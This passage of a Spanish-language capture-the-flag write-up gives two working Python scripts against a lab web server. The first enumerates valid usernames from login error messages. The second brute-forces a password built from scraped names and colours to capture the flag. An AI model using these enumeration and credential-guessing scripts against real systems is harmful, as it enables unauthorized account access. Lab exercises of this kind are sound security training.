De esta forma desarrollamos el siguiente código en Python.

```python
#!/usr/bin/python3
import requests
import subprocess
from bs4 import BeautifulSoup

ResponseGet = requests.get('http://192.168.114.68:8080/about.html')
#En primer lugar, vamos a intentar organizar los datos de cada usuario en una tabla para luego, de forma organizada intentar utilizar estas credenciales para acceder al área /login-3.

Soup = BeautifulSoup(ResponseGet.text, 'lxml')

TrashList = list(str(Soup.table).split('<tr>'))

String = ""

for i in range(1, len(TrashList)):#Repasamos todos los elementos de la tabla en busca de aquellas entradas que contienen el email y las preparamos en una lista quitando caracteres innecesarios.
    if '@' in TrashList[i]:
        String += TrashList[i].split('<td>')[3].replace('\n','')

EmailList = list(String.split('</td>'))

for i in range(1,len(EmailList)):#Seguidamente, con la tabla de emails ya preparada realizamos las requests. Previamente deberíamos de haber copiado el mensaje de error que la página despliega cuando un usario no valido se introduce en una petición de logeo. Realizamos la petición y examinamos el contenido de la respuesta, si localizamos el mensaje de error descartamos el email y si no guardamos el email con uno válido.
    ResponsePost = requests.post('http://192.168.114.68:8080/login-3/index.php', data = {'username': EmailList[i] , 'password': 'TEST'})
    
    if not "[ERROR] No Such User" in ResponsePost.text:
        ValidUser = EmailList[i]
        break

for i in range(1,len(TrashList)):#Por último, desplegamos el nombre asociado al email quitando algunos caracteres innecesearios.
    if ValidUser in TrashList[i]:
        print(TrashList[i].split('<td>')[1].replace('</td>',''))

```

<br />

**4. La contraseña de la cuenta válida es el nombre de pila de su colega favorito y el color favorito de su jefe dos veces seguidas. Por ejemplo, si su mejor amigo es Jacob y su jefe es Carly, entonces la contraseña es JacobOrangeJacobOrange. Utilice este conocimiento para autenticarse en el sitio web para obtener la bandera.**

```python
#!/usr/bin/python3
import requests
import subprocess
from bs4 import BeautifulSoup

ResponseGet = requests.get('http://192.168.114.68:8080/about.html')
#En primer lugar, vamos a intentar organizar los datos de cada usuario en una tabla para luego, de forma organizada intentar utilizar estas credenciales para acceder al área /login-3.

Soup = BeautifulSoup(ResponseGet.text, 'lxml')

TrashList = list(str(Soup.table).split('<tr>'))

username = "dvaliant@bedlamdynamics.com"
#Primero creamos sendas listas para nombres y colores favoritos.
users = ""
colors = ""
for i in range(2,len(TrashList)):
    users += TrashList[i].split('<td>')[1].replace('</td>','').replace('\n','')+","

users +="Brianne"


for i in range(2,len(TrashList)):
    colors += TrashList[i].split('<td>')[4].replace('</td>','').replace('\n','').replace('</tr>','')+","
    
colors += "cyan"
userList = list(users.split(','))
colorList = list(colors.replace('</tbody></table>','').split(','))

for i in range(0,len(userList)):#Seguidamente realizamos requests con todos las combinaciones posibles de acuerdo a las reglas del enunciado.
    for j in range(0,len(colorList)):
        FirstChar = colorList[j][0].swapcase()
        color = FirstChar
        for n in range(1,len(colorList[j])):
            color += colorList[j][n]

        password = userList[i]+color+userList[i]+color
        ResponsePost = requests.post('http://192.168.114.68:8080/login-3/index.php', data = {'username': username,'password': password})
        if not "[ERROR]" in ResponsePost.text:#Por último comprobamos la respuesta de cada request con el objetivo de verificar si está la Flag.
            print("[+] "+username+":"+password)
            Soup = BeautifulSoup(ResponsePost.text, 'lxml')
            print(Soup.body.div.contents[0].replace('\n',''))
            exit(0)
```

<br />


